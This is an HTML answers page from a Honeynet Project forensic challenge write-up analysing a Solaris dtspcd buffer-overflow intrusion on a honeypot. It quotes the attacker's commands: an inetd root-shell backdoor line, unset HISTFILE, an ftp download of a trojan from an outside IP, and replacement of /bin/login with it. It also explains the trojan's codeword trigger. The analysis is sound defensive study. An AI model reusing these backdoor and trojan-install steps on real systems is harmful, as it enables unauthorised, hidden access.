@@ -1,0 +1,174 @@
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01//EN"><html><head><title>Answers</title><meta name="GENERATOR" content="Modular DocBook HTML Stylesheet Version 1.64"><link rel="HOME" href="x369_files/t1.html"><link rel="PREVIOUS" title="Analysis" href="x369_files/x36.html"><link rel="NEXT" title="Complete Alert File for Q2" href="x369_files/q2_alerts.html"></head>
+<body class="SECT1" bgcolor="#ffffff" text="#000000" link="#0000ff" vlink="#840084" alink="#0000ff"><div class="NAVHEADER"><table width="100%" border="0" cellpadding="0" cellspacing="0"><tbody><tr><th colspan="3" align="center"></th></tr><tr><td width="10%" align="left" valign="bottom"><a href="http://project.honeynet.org/scans/scan20/sol/30/x36.html">&lt;&lt;&lt; Previous</a></td><td width="80%" align="center" valign="bottom"></td><td width="10%" align="right" valign="bottom"><a href="http://project.honeynet.org/scans/scan20/sol/30/q2_alerts.html">Next &gt;&gt;&gt;</a></td></tr></tbody></table><hr align="left" width="100%"></div><div class="SECT1"><h1 class="SECT1"><a name="AEN369">Answers</a></h1><div class="SECT2"><h2 class="SECT2"><a name="AEN371">Q1 Answer</a></h2><font color="RED">What is a NOP slide, and how is this one different
+	from the NOP slide in the <tt class="APPLICATION">rpc.statd</tt>
+	exploit in Scan 10?</font><p>A "NOP sled", as it is more commonly known, is a series
+	of no-operation instructions in the machine code of the target
+	architecture.  This series is often used as part of a buffer
+	overflow technique, where the return address in the call stack
+	is modified to point to exploit code.  By using a NOP sled,
+	the precise address of the exploit code need not be known &#8212;
+	instead, an address in the middle of the NOPs is chosed, causing
+	execution to <i class="EMPHASIS">slide</i> into the exploit
+	code.</p><p>In Scan 10, a standard 0x90 NOP sled was used as part of
+	a format string attack for the x86 architecture.
+	Scan 20 uses one of the many possible NOP instructions
+	available on the Sparc architecture, in this 0x801c4011.</p></div><div class="SECT2"><h2 class="SECT2"><a name="AEN378">Q2 Answer</a></h2><font color="RED">The attack was on 08 Jan, 2002.  Would Snort have
+	generated an alert then for the attack?</font><p>Yes.  There has been an alert for
+	sid-645 (NOP sled 0x801c4011 for the sparc architecture) in
+	<tt class="FILENAME">shellcode.rules</tt> since that
+	file was added to the <tt class="APPLICATION">snort</tt> CVS repository,
+	on 17-Apr-2001.  It appears to have existed
+	in <tt class="FILENAME">exploit.rules</tt> previous
+	to that date.</p></div><div class="SECT2"><h2 class="SECT2"><a name="Q3_ANSWER">Q3 Answer</a></h2><font color="RED">In the exploit code, the command
+	"/bin/sh sh -i" is given.
+	What is its purpose, and why is 'sh' shown twice?</font><p>The command <b class="COMMAND">/bin/sh sh -i</b> appearing
+	in the exploit code is actually part of an
+	<tt class="APPLICATION">inetd</tt> configuration file.  An excerpt from the manual page for
+	<tt class="FILENAME">inetd.conf</tt> explains the two fields used
+	by this portion of the command:
+<a name="AEN392"></a><table border="0" width="100%" cellspacing="0" cellpadding="0" class="BLOCKQUOTE"><tbody><tr><td width="10%" valign="top"> </td><td width="80%" valign="top"><p class="LITERALLAYOUT">     server-program      Either the pathname of a server program<br>
+                         to be invoked by inetd to perform the<br>
+                         requested service, or the value internal<br>
+                         if inetd itself provides the service.<br>
+<br>
+     server-arguments    If a server must be invoked with command<br>
+                         line arguments, the entire command line<br>
+                         (including argument 0) must appear in<br>
+                         this field (which consists of all<br>
+                         remaining words in the entry).</p></td><td width="10%" valign="top"> </td></tr><tr><td colspan="2" align="right" valign="top">--<span class="ATTRIBUTION">Sun Manual Pages - <tt class="FILENAME">inetd.conf</tt></span></td><td width="10%"> </td></tr></tbody></table>
+	</p><p>In plain English, the initial <b class="COMMAND">/bin/sh</b>
+	indicates the actual name of the application which
+	<tt class="APPLICATION">inetd</tt> starts up when receiving a connection
+	on the port named in the configuration.  The
+	"sh -i" portion is the argument list passed to the
+	application.  What is tricky, and explains why
+	"sh" is shown twice, is that the C libraries
+	define the argument array (<tt class="VARNAME">argv[]</tt>)
+	to include the actual name of the application
+	at position 0.  In this case, the second "sh"
+	is just the value at position 0 in the
+	<tt class="VARNAME">argv[]</tt> array.</p><p>It's useful to know that some programs
+	look at the value of <tt class="VARNAME">argv[0]</tt>
+	to determine how they were invoked, and change
+	their behaviour accordingly.  <tt class="APPLICATION">Gzip</tt>
+	is a great example of this; <tt class="APPLICATION">gunzip</tt>
+	is hard linked to the same executable, and the program
+	looks at <tt class="VARNAME">argv[0]</tt> to determine
+	the default options.</p></div><div class="SECT2"><h2 class="SECT2"><a name="Q4_ANSWER">Q4 Answer</a></h2><font color="RED">The attacker executed a variety of commands on 
+        the hacked Solaris box.  Which commands were automated by the
+	exploit, and which commands were manually entered by the attacker
+	himself?</font><p>There were two successful TCP connections made to the
+	honeypot, during the time period covered by <tt class="FILENAME">0108@000-snort.log</tt>.
+	The following two tables cover the commands the attacker
+	had executed, and indicates which commands were automated
+	and which were manual.  Whitespace has been added into the
+	commands to improve readability, but any commands appearing
+	within a single row were submitted by the attacker
+	as a single unit.</p><div class="TABLE"><a name="AEN411"></a><p><b>Table 1. Initial buffer overflow exploit</b></p><table border="1" bgcolor="#e0e0e0" cellspacing="0" cellpadding="4" class="CALSTABLE"><thead><tr><th width="38%" align="left" valign="top">Attacker Command</th><th width="12%" align="left" valign="top">Automated or Manual</th><th width="50%" align="left" valign="top">Comments</th></tr></thead><tbody><tr><td width="38%" align="left" valign="top"><table border="0" bgcolor="#e0e0e0" width="100%"><tbody><tr><td><pre class="SCREEN">echo "ingreslock stream tcp nowait root /bin/sh sh -i" &gt; /tmp/x;
+/usr/sbin/inetd -s /tmp/x;
+sleep 10;
+/bin/rm -f /tmp/x AAAA...AAA</pre></td></tr></tbody></table></td><td width="12%" align="left" valign="top">Automated</td><td width="50%" align="left" valign="top"><p>These commands were all part of one long
+			string as part of machine code that was embedded
+			into a message sent to the <tt class="APPLICATION">dtscd</tt> service.
+			The length of such a buffer overflow exploit
+			makes it prohibitive for a user to enter
+			manually, so these exploits are routinely
+			automated by the black hat community.</p></td></tr></tbody></table></div><div class="TABLE"><a name="AEN430"></a><p><b>Table 2. Shell session through <tt class="APPLICATION">inetd</tt> backdoor</b></p><table border="1" bgcolor="#e0e0e0" cellspacing="0" cellpadding="4" class="CALSTABLE"><thead><tr><th width="11%" align="left" valign="top">Time since previous command</th><th width="33%" align="left" valign="top">Attacker Command</th><th width="11%" align="left" valign="top">Automated or Manual</th><th width="44%" align="left" valign="top">Comments</th></tr></thead><tbody><tr><td width="11%" align="left" valign="top"> </td><td width="33%" align="left" valign="top"><i class="EMPHASIS">[...the connection is opened (TCP handshake completed)...]</i></td><td width="11%" align="left" valign="top"> </td><td width="44%" align="left" valign="top"> </td></tr><tr><td width="11%" align="left" valign="top">0.000025</td><td width="33%" align="left" valign="top"><table border="0" bgcolor="#e0e0e0" width="100%"><tbody><tr><td><pre class="SCREEN">uname -a;
+ls -l /core /var/dt/tmp/DTSPCD.log;
+PATH=/usr/local/bin:/usr/bin:/bin:/usr/sbin:/sbin:/usr/ccs/bin:/usr/gnu/bin;
+export PATH;
+echo "BD PID(s): "`ps -fed|grep ' -s /tmp/x'|grep -v grep|awk '{print $2}'`</pre></td></tr></tbody></table></td><td width="11%" align="left" valign="top">automated</td><td width="44%" align="left" valign="top">The packet containing this long string of
+				commands is so quick in following the
+				TCP connection handshake that we believe
+				it must be built into whatever
+				<tt class="APPLICATION">telnet</tt>-like
+				program the attacker was using.</td></tr><tr><td width="11%" align="left" valign="top">3.86</td><td width="33%" align="left" valign="top">w</td><td width="11%" align="left" valign="top">manual</td><td width="44%" align="left" valign="top">Given the pause before this command
+			is entered, and the very long pause afterwards,
+			it seems reasonable to conclude that this was
+			a manually issued directive.</td></tr><tr><td width="11%" align="left" valign="top">27.39</td><td width="33%" align="left" valign="top">unset HISTFILE</td><td rowspan="3" width="11%" align="left" valign="top">manual</td><td rowspan="3" width="44%" align="left" valign="top"><p>These were either pasted into
+                        a shell by the user, or provided as some kind of
+                        macro by a connecting program.</p><p>We
+			believe that if it were another macro,
+			like the initial text, then either these commands
+			would have been sent in one packet, or the packets
+			would have followed each other much more closely
+			than they did.  However, the last command appears
+			only 0.5 seconds after the previous command, which
+			is far too quick a rate to type at.  So our best
+			guess is that these commands were manually pasted
+			into the session.</p></td></tr><tr><td width="11%" align="left" valign="top">0.09</td><td width="33%" align="left" valign="top"><table border="0" bgcolor="#e0e0e0" width="100%"><tbody><tr><td><pre class="PROGRAMLISTING">cd tmp
+mkdir /usr/lib</pre></td></tr></tbody></table></td></tr><tr><td width="11%" align="left" valign="top">0.58</td><td width="33%" align="left" valign="top">mv /bin/login /usr/lib/libfl.k</td></tr><tr><td width="11%" align="left" valign="top">9.35</td><td width="33%" align="left" valign="top">ftp 64.224.118.115</td><td rowspan="9" width="11%" align="left" valign="top">manual</td><td rowspan="9" width="44%" align="left" valign="top"><p>A manual ftp with user-typed
+                          commands.  The fairly long times between
+			  packets is a dead giveaway.  The times at the
+			  end of the <tt class="APPLICATION">ftp</tt>
+			  session imply that the user was making use
+			  of buffering on the honeypot side (since
+			  it is unlikely that the <tt class="APPLICATION">sun1</tt> program only
+			  took one second to download) to enter
+			  commands.</p></td></tr><tr><td width="11%" align="left" valign="top">4.48</td><td width="33%" align="left" valign="top">ftp</td></tr><tr><td width="11%" align="left" valign="top">1.82</td><td width="33%" align="left" valign="top">a@</td></tr><tr><td width="11%" align="left" valign="top">2.62</td><td width="33%" align="left" valign="top">cd pub</td></tr><tr><td width="11%" align="left" valign="top">1.41</td><td width="33%" align="left" valign="top">binary</td></tr><tr><td width="11%" align="left" valign="top">1.97</td><td width="33%" align="left" valign="top">get sun1</td></tr><tr><td width="11%" align="left" valign="top">1.05</td><td width="33%" align="left" valign="top">bye</td></tr><tr><td width="11%" align="left" valign="top">17.58</td><td width="33%" align="left" valign="top"><i class="EMPHASIS">[...newline...]</i></td></tr><tr><td width="11%" align="left" valign="top">0.95</td><td width="33%" align="left" valign="top">ls</td></tr><tr><td width="11%" align="left" valign="top">6.13</td><td width="33%" align="left" valign="top">chmod 555 sun1</td><td rowspan="2" width="11%" align="left" valign="top">manual</td><td rowspan="2" width="44%" align="left" valign="top"><p>Again,
+			the timing of the
+			second line (too fast to type, too slow to be
+			a macro) suggests that these two lines are
+			the result of pasting.</p></td></tr><tr><td width="11%" align="left" valign="top">0.78</td><td width="33%" align="left" valign="top">mv sun1 /bin/login</td></tr></tbody></table></div></div><div class="SECT2"><h2 class="SECT2"><a name="AEN519">Q5 Answer</a></h2><font color="RED">What is <tt class="APPLICATION">sun1</tt> and how does
+	it work?</font><p>The <tt class="APPLICATION">sun1</tt> application is a trojan replacement
+	for <tt class="APPLICATION">/bin/login</tt>.  When invoked, <tt class="APPLICATION">sun1</tt>
+	checks for the presence of a codeword (setting
+	the environment variable <tt class="VARNAME">DISPLAY</tt>
+	to &#8220;pirc&#8221;) among the
+	environment variables.  If the codeword is found, then <tt class="APPLICATION">sun1</tt>
+	launches a shell.  If the codeword is not found,
+	then <tt class="APPLICATION">sun1</tt> launches the original <tt class="APPLICATION">/bin/login</tt> program
+	which then prompts for a username and password.
+	</p></div><div class="SECT2"><h2 class="SECT2"><a name="AEN531">Q6 Answer</a></h2><font color="RED">What did you learn from this exercise?</font><p>	<a name="AEN535"></a><table border="0" width="100%" cellspacing="0" cellpadding="0" class="BLOCKQUOTE"><tbody><tr><td width="10%" valign="top"> </td><td width="80%" valign="top"><p>What was really interesting about this exercise
+	    was that there was a lot of potential for reasonably
+	    answering the questions without learning too much.
+	    In our case, the fact that there were two of us opened
+	    the door for more questions as we read over the results
+	    of the other.  For instance, the NOP sled question was
+	    fairly obvious in its answer, but Brad's inclusion of
+	    the disassembly of the exploit led to my investigating
+	    the purpose of the initial three instructions, which led
+	    to finding the document which explains all about buffer
+	    overflows for various architectures.</p><p>I also learned a bit about sparc assembly, which
+	    I'd never worked with before.  And trying
+	    to generate a disassembly of <tt class="APPLICATION">sun1</tt> had me thinking
+	    quite a bit in order to avoid running dangerous code.
+	    </p></td><td width="10%" valign="top"> </td></tr><tr><td colspan="2" align="right" valign="top">--<span class="ATTRIBUTION">Bo Adler</span></td><td width="10%"> </td></tr></tbody></table>
+	</p><p>	<a name="AEN541"></a><table border="0" width="100%" cellspacing="0" cellpadding="0" class="BLOCKQUOTE"><tbody><tr><td width="10%" valign="top"> </td><td width="80%" valign="top"><p>I was really surprised to learn a few things about
+            the telnet protocol.  I didn't know that telnet included
+            a scheme for passing on environment variables like 
+            <tt class="VARNAME">TERM</tt> and <tt class="VARNAME">DISPLAY</tt>.  
+            I remembered telnet's <tt class="VARNAME">LINEMODE</tt> control
+            vaguely, but this brought it to my attention again.</p><p>I also learned a good deal of sparc assembly trivia.</p></td><td width="10%" valign="top"> </td></tr><tr><td colspan="2" align="right" valign="top">--<span class="ATTRIBUTION">Brad Threatt</span></td><td width="10%"> </td></tr></tbody></table>
+	</p></div><div class="SECT2"><h2 class="SECT2"><a name="AEN548">Q7 Answer</a></h2><font color="RED">How long did this challenge take you?</font><p>Some initial "quick and dirty" research yielded most
+	of the answers within 90 minutes.  We found that writing
+	up our thoughts formally took a great deal of time, and
+	encouraged us pursue further research for completeness.
+	In the end,
+	this challenge took us about 30 hours, of which over half
+	was spent writing this document, and the remainder was
+	spent getting more detailed analysis on the questions.</p></div><div class="SECT2"><h2 class="SECT2"><a name="AEN552">Bonus Question Answer</a></h2><font color="RED">One of the commands executed during
+	    the attack is:
+<b class="COMMAND">echo "BD PID(s): "`ps -fed|grep ' -s /tmp/x'|grep -v grep|awk '{print $2}'`</b>
+	    What is the purpose of this command and what does
+	    'BD' stand for?</font><p>To understand the purpose, the first step is
+	to decode the embedded pipeline (contained between
+	the backticks).  What this pipeline does is get a
+	process listing of all running programs, using
+	<tt class="APPLICATION">ps</tt>.  The listing is then
+	<tt class="APPLICATION">grep</tt>'d  for all occurences of the string " -s /tmp/x"
+	(the leading space is important to avoid the appearance
+	of trying to pass the <tt class="OPTION">-s</tt> option to <tt class="APPLICATION">grep</tt>).
+	That string was seen before, in the initial exploit
+	as part of the commandline for launching <tt class="APPLICATION">inetd</tt>,
+	so the first two parts of the pipeline must be
+	intending to capture all <tt class="APPLICATION">inetd</tt> processes using
+	<tt class="FILENAME">/tmp/x</tt> as their configuration file.
+	The third part of the pipeline removes the <tt class="APPLICATION">grep</tt>
+	process which also happens to have the same string
+	in its arguments (from the second stage of the pipeline).
+	And finally, the last part prints the process ID number
+	of the found <tt class="APPLICATION">inetd</tt> process(es).</p><p>So, the purpose of the command is to locate all
+	the running <tt class="APPLICATION">inetd</tt> backdoors (the acronym "BD" is for
+	"back door"), and list their PIDs.
+	</p></div></div><div class="NAVFOOTER"><hr align="left" width="100%"><table width="100%" border="0" cellpadding="0" cellspacing="0"><tbody><tr><td width="33%" align="left" valign="top"><a href="http://project.honeynet.org/scans/scan20/sol/30/x36.html">&lt;&lt;&lt; Previous</a></td><td width="34%" align="center" valign="top"><a href="http://project.honeynet.org/scans/scan20/sol/30/t1.html">Home</a></td><td width="33%" align="right" valign="top"><a href="http://project.honeynet.org/scans/scan20/sol/30/q2_alerts.html">Next &gt;&gt;&gt;</a></td></tr><tr><td width="33%" align="left" valign="top">Analysis</td><td width="34%" align="center" valign="top"> </td><td width="33%" align="right" valign="top">Complete Alert File for Q2</td></tr></tbody></table></div></body></html>
